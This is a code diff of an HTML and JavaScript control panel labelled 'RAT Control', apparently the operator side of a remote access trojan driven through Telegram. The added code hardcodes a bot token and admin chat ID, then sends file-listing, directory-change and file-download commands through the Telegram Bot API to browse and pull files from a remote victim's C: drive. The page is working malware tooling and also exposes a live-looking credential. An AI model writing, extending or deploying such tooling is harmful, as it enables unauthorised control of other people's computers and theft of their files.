@@ -4,159 +4,218 @@
     <title>RAT Control</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, sans-serif;
-            padding: 16px;
-            background: #f5f5f5;
+            background: #f0f0f0;
+            padding: 20px;
         }
+        .header {
+            background: #0088cc;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .button {
+            background: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 15px 20px;
+            font-size: 16px;
+            width: 100%;
+            margin: 5px 0;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .button:hover { background: #006699; }
+        .button.secondary { background: #666; }
+        .button.danger { background: #dc3545; }
         .file-list {
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
             margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
         }
         .file-item {
             padding: 10px;
-            border-bottom: 1px solid #ddd;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
             cursor: pointer;
         }
-        .file-item:hover {
-            background: #e0e0e0;
-        }
+        .file-item:hover { background: #f5f5f5; }
+        .icon { font-size: 20px; margin-right: 10px; }
+        .name { flex: 1; }
+        .size { color: #666; font-size: 12px; }
         .status {
-            margin-top: 20px;
+            margin-top: 10px;
             padding: 10px;
-            border-radius: 8px;
+            border-radius: 5px;
             display: none;
         }
-        .loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255,255,255,0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .loading.hidden {
-            display: none;
+        .status.success { background: #d4edda; color: #155724; display: block; }
+        .status.error { background: #f8d7da; color: #721c24; display: block; }
+        .path {
+            background: #e9ecef;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            word-break: break-all;
         }
     </style>
 </head>
 <body>
-    <h1>📁 Файловый менеджер</h1>
-    
-    <div id="currentPath">Загрузка...</div>
-    
-    <div style="margin: 20px 0;">
-        <button onclick="loadFiles()">📋 Обновить список</button>
-        <button onclick="goBack()">⬆️ Назад</button>
+    <div class="header">
+        <h1>🤖 RAT CONTROL</h1>
+        <p>Управление компьютером через Telegram</p>
     </div>
-    
+
+    <div class="path" id="currentPath">C:\</div>
+
+    <button class="button" onclick="loadFiles()">📋 Загрузить файлы</button>
+    <button class="button secondary" onclick="goBack()">⬆️ Назад</button>
+
+    <div class="input-group" style="display: flex; gap: 8px; margin: 10px 0;">
+        <input type="text" id="folderInput" placeholder="Введите путь к папке" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 5px;">
+        <button class="button secondary" onclick="changeDir()" style="width: auto;">Перейти</button>
+    </div>
+
+    <div class="input-group" style="display: flex; gap: 8px; margin: 10px 0;">
+        <input type="text" id="fileInput" placeholder="Имя файла для скачивания" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 5px;">
+        <button class="button secondary" onclick="downloadFile()" style="width: auto;">📥 Скачать</button>
+    </div>
+
+    <div id="status" class="status"></div>
+
     <div id="fileList" class="file-list">
-        Нажмите кнопку для загрузки
-    </div>
-    
-    <div class="loading hidden" id="loading">
-        <div style="text-align: center;">
-            <div style="font-size: 48px;">⏳</div>
-            <div>Загрузка...</div>
+        <div style="text-align: center; color: #666; padding: 20px;">
+            Нажмите кнопку для загрузки файлов
         </div>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        
+        // Глобальные переменные
         let currentDir = 'C:\\';
-        let pendingRequest = null;
+        const ADMIN_ID = 7266658879;
+        const BOT_TOKEN = '8417099264:AAHZ_xx4NfBLs04BoGyutO0_dwaa66b-ECo';
         
-        // Функция загрузки файлов
-        function loadFiles() {
-            showLoading();
-            pendingRequest = Date.now();
+        // Функция отправки запроса к боту через HTTP (НЕ через Telegram)
+        async function sendBotRequest(action, params = {}) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             
-            tg.sendData(JSON.stringify({
-                action: 'list_files',
-                path: currentDir,
-                requestId: pendingRequest
-            }));
+            const message = {
+                chat_id: ADMIN_ID,
+                text: JSON.stringify({
+                    action: action,
+                    params: params,
+                    from_webapp: true
+                })
+            };
+            
+            showStatus('⏳ Отправка запроса...', 'info');
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+                
+                const data = await response.json();
+                console.log('📨 Ответ:', data);
+                
+                if (data.ok) {
+                    showStatus('✅ Запрос отправлен', 'success');
+                } else {
+                    showStatus('❌ Ошибка отправки', 'error');
+                }
+                
+                return data;
+            } catch (error) {
+                showStatus('❌ ' + error.message, 'error');
+                return null;
+            }
         }
-        
+
+        // Функция для получения файлов
+        async function loadFiles() {
+            showStatus('⏳ Запрос списка файлов...', 'info');
+            await sendBotRequest('list_files', { path: currentDir });
+        }
+
         // Функция "Назад"
-        function goBack() {
-            showLoading();
-            pendingRequest = Date.now();
-            
-            tg.sendData(JSON.stringify({
-                action: 'go_back',
-                path: currentDir,
-                requestId: pendingRequest
-            }));
+        async function goBack() {
+            await sendBotRequest('go_back', { path: currentDir });
         }
-        
+
+        // Смена директории
+        async function changeDir() {
+            const path = document.getElementById('folderInput').value;
+            if (!path) return;
+            await sendBotRequest('change_dir', { current: currentDir, path: path });
+            document.getElementById('folderInput').value = '';
+        }
+
+        // Скачать файл
+        async function downloadFile() {
+            const name = document.getElementById('fileInput').value;
+            if (!name) return;
+            const path = currentDir + '\\' + name;
+            await sendBotRequest('get', { path: path });
+            document.getElementById('fileInput').value = '';
+        }
+
         // Отображение файлов
         function displayFiles(data) {
             if (!data || !data.files) return;
             
             currentDir = data.current_dir;
-            document.getElementById('currentPath').innerText = currentDir;
+            document.getElementById('currentPath').textContent = currentDir;
             
             let html = '';
             data.files.forEach(f => {
                 const icon = f.is_dir ? '📁' : '📄';
                 html += `
-                    <div class="file-item" onclick="downloadFile('${f.name}')">
-                        ${icon} ${f.name} 
-                        <span style="float:right">${f.size}</span>
+                    <div class="file-item" onclick="selectFile('${f.name}')">
+                        <span class="icon">${icon}</span>
+                        <span class="name">${f.name}</span>
+                        <span class="size">${f.size}</span>
                     </div>
                 `;
             });
             
             document.getElementById('fileList').innerHTML = html;
-            hideLoading();
+            showStatus('✅ Файлы загружены', 'success');
         }
-        
-        // Скачивание файла
-        function downloadFile(name) {
-            tg.sendData(JSON.stringify({
-                action: 'get',
-                path: currentDir + '\\' + name,
-                requestId: Date.now()
-            }));
+
+        // Выбор файла
+        function selectFile(name) {
+            document.getElementById('fileInput').value = name;
         }
-        
-        // Показ загрузки
-        function showLoading() {
-            document.getElementById('loading').classList.remove('hidden');
+
+        // Статус
+        function showStatus(text, type) {
+            const status = document.getElementById('status');
+            status.className = 'status ' + type;
+            status.textContent = text;
+            setTimeout(() => {
+                status.className = 'status';
+            }, 3000);
         }
-        
-        function hideLoading() {
-            document.getElementById('loading').classList.add('hidden');
-        }
-        
-        // Обработка входящих данных
-        tg.onEvent('web_app_data', function(data) {
-            try {
-                const response = JSON.parse(data);
-                console.log('📩 Получено:', response);
-                
-                if (response.data && response.data.files) {
-                    displayFiles(response.data);
-                } else if (response.error) {
-                    alert('Ошибка: ' + response.error);
-                    hideLoading();
-                }
-            } catch (e) {
-                console.error('Ошибка парсинга:', e);
-                hideLoading();
-            }
-        });
-        
-        // Загружаем при старте
-        setTimeout(loadFiles, 500);
+
+        // Слушаем ответы от бота (они приходят в чат, но мы их ловим через getUpdates)
+        // Для простоты пока просто показываем, что нужно обновить страницу
+        setInterval(async () => {
+            // Здесь можно добавить периодическую проверку новых сообщений
+            // Но для начала просто скажем пользователю обновить страницу
+        }, 5000);
     </script>
 </body>
 </html>
